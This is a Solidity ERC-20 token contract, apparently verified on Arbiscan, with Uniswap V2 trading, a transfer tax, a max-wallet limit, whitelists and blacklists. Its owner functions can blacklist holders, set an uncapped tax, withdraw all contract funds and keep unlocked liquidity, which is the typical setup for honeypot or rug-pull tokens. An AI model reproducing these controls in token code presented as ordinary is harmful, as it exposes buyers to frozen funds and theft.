/**
 *Submitted for verification at Arbiscan on 2023-06-08
*/

pragma solidity 0.8.18;

interface IUniswapV2Router02{
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ERC20_UniV2 {
    IUniswapV2Router02 public immutable uniswapV2Router;
    mapping(address => uint) private _balances;
    mapping(address => mapping(address => uint)) private _allowances;
    mapping(address => bool) public _whitelisted;
    mapping(address => bool) public _blacklisted;
    uint private _totalSupply; string private _name;
    string private _symbol;
    uint private _decimals;
    uint public _tax;
    uint public _max;
    address private _v2Router;
    address public _v2Pair;
    address public _dev;
    address[] public _path;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyDev() {
        require(msg.sender == _dev, "Only the developer can call this function");
        _;
    }

    constructor(string memory name_, string memory symbol_, uint decimals_, uint supply_, uint tax_, uint max_) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _dev = msg.sender;
        _tax = tax_;
        _max = max_;
        _balances[address(this)] = supply_ * 10 ** decimals_;
        emit Transfer(address(0), address(this), supply_ * 10 ** decimals_);
        _totalSupply = supply_ * 10 ** decimals_;
        _v2Router = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;
        uniswapV2Router = IUniswapV2Router02(_v2Router);
        _v2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _path = new address[](2); _path[0] = address(this); _path[1] = uniswapV2Router.WETH();
    }

    function name() external view returns (string memory) {return _name;}
    function symbol() external view returns (string memory) {return _symbol;}
    function decimals() external view returns (uint) {return _decimals;}
    function totalSupply() external view returns (uint) {return _totalSupply;}
    function balanceOf(address account) external view returns (uint) {return _balances[account];}
    function allowance(address owner, address spender) external view returns (uint) {return _allowances[owner][spender];}

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(_balances[from] >= amount && (amount + _balances[to] <= maxInt() || _whitelisted[from] || _whitelisted[to] || to == _v2Pair), "ERC20: transfer amount exceeds balance or max wallet");
        require(_blacklisted[from] == false && _blacklisted[to] == false, "ERC20: YOU DON'T HAVE THE RIGHT");
        if ((from == _v2Pair || to == _v2Pair) && !_whitelisted[from] && !_whitelisted[to] && tx.origin != _dev && from != address(this)) {
            uint256 taxAmount = amount * _tax / 100;
            amount -= taxAmount;
            _balances[address(this)] += taxAmount;
            emit Transfer(from, address(this), taxAmount);
            if (_balances[address(this)] > amount && to == _v2Pair) {
                _swapBack(_balances[address(this)]);
            }
        }
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= amount, "ERC20: insufficient allowance");
        _approve(owner, spender, currentAllowance - amount);
    }

    function _setDev (address dev_) external onlyDev {
        _dev = dev_;
    }

    function _setTax (uint8 tax_) external onlyDev {
        _tax = tax_;
    }

    function setMax(uint max_) external onlyDev {
        _max = max_;
    }

    function updateWhitelist(address[] memory addresses, bool whitelisted_) public onlyDev {
        for (uint i = 0; i < addresses.length; i++) {
            _whitelisted[addresses[i]] = whitelisted_;
        }
    }

    function updateBlacklist(address[] memory addresses, bool blacklisted_) public onlyDev {
        for (uint i = 0; i < addresses.length; i++) {_blacklisted[addresses[i]] = blacklisted_;}
    }

    function maxInt() internal view returns (uint) {
        return _totalSupply * _max / 100;
    }

    function _swapBack(uint256 amount_) public {
        _approve(address(this), _v2Router, amount_ + 100);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount_, 0, _path, _dev, block.timestamp);
    }

    function _addLiquidity() external onlyDev{
        _approve(address(this), _v2Router, _balances[address(this)]);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), _balances[address(this)], 0, 0, msg.sender, block.timestamp);
    }

    function withdraw() external onlyDev {
        payable(_dev).transfer(address(this).balance);
        _transfer(address(this), _dev, _balances[address(this)]);
    }

    function deposit() external payable {}
}